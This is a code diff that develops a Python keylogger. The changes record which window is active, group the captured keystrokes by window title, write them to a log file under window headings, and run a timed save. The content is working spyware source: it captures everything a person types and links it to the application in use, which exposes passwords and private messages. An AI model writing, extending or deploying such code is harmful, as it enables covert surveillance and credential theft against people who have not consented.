@@ -3,17 +3,19 @@ import datetime
 import sys
 from abc import ABC,abstractmethod
 from threading import Timer
+import pygetwindow
 
 
 class KeyloggerService:
     def __init__(self):
-        self.logs = []
+        self.logs = {}
         self.listener = None
-        # self.exception = {keyboard.Key.tab, keyboard.Key.enter, keyboard.Key.alt,
-        #                   keyboard.Key.alt_l, keyboard.Key.alt_gr, keyboard.Key.backspace,
-        #                   keyboard.Key.caps_lock, keyboard.Key.ctrl_r, keyboard.Key.ctrl_l,
-        #                   keyboard.Key.shift_l, keyboard.Key.shift_r}
 
+    def get_active_window(self):
+        try:
+            return pygetwindow.getActiveWindowTitle()
+        except:
+            return "Unknown"
 
     def on_press(self, key):
         if key == keyboard.Key.alt_l:
@@ -22,22 +24,20 @@ class KeyloggerService:
             key = " "
         if key == keyboard.Key.enter:
             key = "\n"
-
-
-        # if keyboard.Key in self.exception:
-        #     key = f" {key} "
-        self.logs.append(key)
+        else:
+            try:
+                key = key.char
+            except AttributeError:
+                key = f" {str(key).replace("Key.","")} "
+        if self.get_active_window() not in self.logs:
+            self.logs[self.get_active_window()] = key
+        else:
+            self.logs[self.get_active_window()] += key
 
 
     def on_release(self, key):
         if key == keyboard.Key.esc:
             return False
-
-
-    def start_listener(self):
-        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as self.listener:
-            self.listener.join()
-
 
 
     def stop_listener(self):
@@ -47,7 +47,7 @@ class KeyloggerService:
 
 
     def clear_logs(self):
-        self.logs = []
+        self.logs = {}
         return self.logs
 
 
@@ -64,9 +64,13 @@ class FileWriter(Writer):
 
     def writer(self,data):
         with open(self.path, "a") as logfile:
-            if isinstance(data, list):
-                for i in data:
-                    logfile.write(str(i))
+            if isinstance(data, dict):
+                for key in data:
+                    logfile.write(f"--{key}--")
+                    logfile.write("\n")
+                    all_data = "".join(data[key])
+                    logfile.write(all_data)
+                    logfile.write("\n")
             else:
                 logfile.write("\n")
                 logfile.write(data)
@@ -89,6 +93,7 @@ class KeyloggerManager:
         self.encryption = Encryptor()
         self.start_time = None
         self.timer = None
+        self.listener = None
 
 
     @staticmethod
@@ -107,9 +112,9 @@ class KeyloggerManager:
 
     def start_logging(self):
         self.start_time = KeyloggerManager.get_time()
-        self.keylogger_service.start_listener()
-        self.timer = Timer(interval=10,function=self.save_data)
-        # self.timer.daemon = True
+        with keyboard.Listener(on_press=self.keylogger_service.on_press,on_release=self.keylogger_service.on_release) as self.listener:
+            self.listener.join()
+        self.timer = Timer(interval=60,function=self.save_data)
         self.timer.start()
 
 
